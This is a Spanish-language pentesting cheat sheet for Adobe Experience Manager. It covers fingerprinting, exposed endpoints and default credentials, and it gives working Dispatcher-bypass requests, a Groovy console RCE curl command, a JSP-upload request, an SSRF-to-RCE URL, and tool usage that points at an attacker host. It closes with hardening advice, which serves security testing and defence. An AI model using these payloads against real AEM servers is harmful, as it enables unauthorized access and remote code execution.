# AEM (Adobe Experience Manager) Pentesting

{{#include ../../banners/hacktricks-training.md}}

> Adobe Experience Manager (AEM, parte de Adobe Experience Cloud) es un CMS empresarial que se ejecuta sobre Apache Sling/Felix (OSGi) y un Repositorio de Contenido Java (JCR).
> Desde la perspectiva de un atacante, las instancias de AEM a menudo exponen puntos finales de desarrollo peligrosos, reglas de Dispatcher débiles, credenciales predeterminadas y una larga lista de CVEs que se parchean cada trimestre.

La lista de verificación a continuación se centra en la **superficie de ataque accesible externamente (sin autenticación)** que sigue apareciendo en compromisos reales (2022-2025).

---

## 1. Fingerprinting
```
$ curl -s -I https://target | egrep -i "aem|sling|cq"
X-Content-Type-Options: nosniff
X-Dispatcher: hu1            # header added by AEM Dispatcher
X-Vary: Accept-Encoding
```
Otros indicadores rápidos:
* `/etc.clientlibs/` ruta estática presente (devuelve JS/CSS).
* `/libs/granite/core/content/login.html` página de inicio de sesión con el banner de “Adobe Experience Manager”.
* `</script><!--/* CQ */-->` comentario al final del HTML.

---

## 2. Puntos finales no autenticados de alto valor

Ruta | Lo que obtienes | Notas
---- | ------------- | -----
`/.json`, `/.1.json` | Nodos JCR a través de **DefaultGetServlet** | A menudo bloqueado, pero *Dispatcher bypass* (ver abajo) funciona.
`/bin/querybuilder.json?path=/` | API de QueryBuilder | Fuga del árbol de páginas, rutas internas, nombres de usuario.
`/system/console/status-*`, `/system/console/bundles` | Consola OSGi/Felix | 403 por defecto; si está expuesto y se encuentran credenciales ⇒ RCE de carga de paquetes.
`/crx/packmgr/index.jsp` | Administrador de paquetes | Permite paquetes de contenido autenticados → carga de payload JSP.
`/etc/groovyconsole/**` | Consola Groovy de AEM | Si está expuesta → ejecución arbitraria de Groovy / Java.
`/libs/cq/AuditlogSearchServlet.json` | Registros de auditoría | Divulgación de información.
`/libs/cq/ui/content/dumplibs.html` | Volcado de ClientLibs | Vector XSS.

### Truco de bypass de Dispatcher
La mayoría de los sitios de producción están detrás del *Dispatcher* (proxy inverso). Sus reglas de filtro pueden ser eludidas al agregar una extensión estática permitida **después de un punto y coma o una nueva línea codificada**:
```
GET /bin/querybuilder.json;%0aa.css?path=/home&type=rep:User HTTP/1.1
```
Una sola solicitud como la anterior frecuentemente revela nodos de perfil de usuario con direcciones de correo electrónico. P-T Partners publicó una buena guía sobre esta debilidad. 【】

---

## 3. Configuraciones incorrectas comunes (aún vigentes en 2025)

1. **Servlet POST anónimo** – `POST /.json` con `:operation=import` te permite plantar nuevos nodos JCR. Bloquear `*.json` POST en el Dispatcher lo soluciona. 【】
2. **Perfiles de usuario legibles por todos** – ACL predeterminado otorga `jcr:read` en `/home/users/**/profile/*` a todos.
3. **Credenciales predeterminadas** – `admin:admin`, `author:author`, `replication:replication`.
4. **WCMDebugFilter** habilitado ⇒ XSS reflejado a través de `?debug=layout` (CVE-2016-7882, aún encontrado en instalaciones heredadas 6.4).
5. **Consola Groovy expuesta** – ejecución remota de código al enviar un script Groovy:
```bash
curl -u admin:admin -d 'script=println "pwn".execute()' https://target/bin/groovyconsole/post.json
```

---

## 4. Vulnerabilidades recientes (cadencia de paquetes de servicio)

Trimestre | CVE | Afectado | Impacto
------- | --- | -------- | ------
Dic 2024 | **CVE-2024-43711** | 6.5.21 y anteriores | Validación de entrada inadecuada → **Ejecución de código arbitrario** (requiere autenticación de bajo privilegio). 【】
Dic 2024 | CVE-2024-43724/26 | 6.5.21 y anteriores | XSS DOM / Almacenado en el Asistente para Mover Página. 【】
Dic 2023 | CVE-2023-48452/68 | ≤ 6.5.18 | XSS basado en DOM a través de URL manipulada. 【】
Dic 2022 | CVE-2022-30683 | ≤ 6.5.13 | Fallo de diseño criptográfico → descifrado de secretos (necesita credenciales de bajo privilegio). 【】

Siempre verifica el boletín *APSB* que coincida con el paquete de servicio del cliente y solicita el último **6.5.22** o *Cloud Service 2024.11*.

---

## 5. Fragmentos de explotación

### 5.1 RCE a través de bypass del dispatcher + carga de JSP
Si la escritura anónima es posible:
```
# 1. Create a node that will become /content/evil.jsp
POST /content/evil.jsp;%0aa.css HTTP/1.1
Content-Type: application/x-www-form-urlencoded

:contentType=text/plain
jcr:data=<% out.println("pwned"); %>
:operation=import
```
Ahora solicita `/content/evil.jsp` – el JSP se ejecuta con el usuario del proceso AEM.

### 5.2 SSRF a RCE (histórico < 6.3)
`/libs/mcm/salesforce/customer.html;%0aa.css?checkType=authorize&authorization_url=http://127.0.0.1:4502/system/console`
`aem_ssrf2rce.py` de **aem-hacker** automatiza toda la cadena. 【】

---

## 6. Herramientas

* **aem-hacker** – script de enumeración tipo navaja suiza, soporta bypass de dispatcher, detección de SSRF, verificación de credenciales por defecto y más.
```bash
python3 aem_hacker.py -u https://target --host attacker-ip
```【】
* **Fuerza bruta de contenido** – solicita recursivamente `/_jcr_content.(json|html)` para descubrir componentes ocultos.
* **osgi-infect** – sube un paquete OSGi malicioso a través de `/system/console/bundles` si hay credenciales disponibles.

---

## 7. Lista de verificación de endurecimiento (para las recomendaciones de su informe)

1. Mantenga la instancia en el **último paquete de servicio acumulativo** (a partir de jul 2025: 6.5.22).
2. Elimine/rote cuentas por defecto; imponga SSO/SAML.
3. Endurezca los **filtros de Dispatcher** – niegue `;`, nuevas líneas codificadas, y `*.json` o `*.querybuilder.json` para usuarios anónimos.
4. Desactive o proteja las consolas (`/system/console`, `/crx/*`, `/etc/groovyconsole`) con listas de permitidos de IP.
5. Aplique el paquete de *Endurecimiento de Permisos Anónimos* enviado por Adobe.

## Referencias

* Boletín de Seguridad de Adobe APSB24-69 – “Actualizaciones de seguridad para Adobe Experience Manager (dic 2024)”.
* 0ang3el – herramienta aem-hacker (GitHub).
{{#include ../../banners/hacktricks-training.md}}
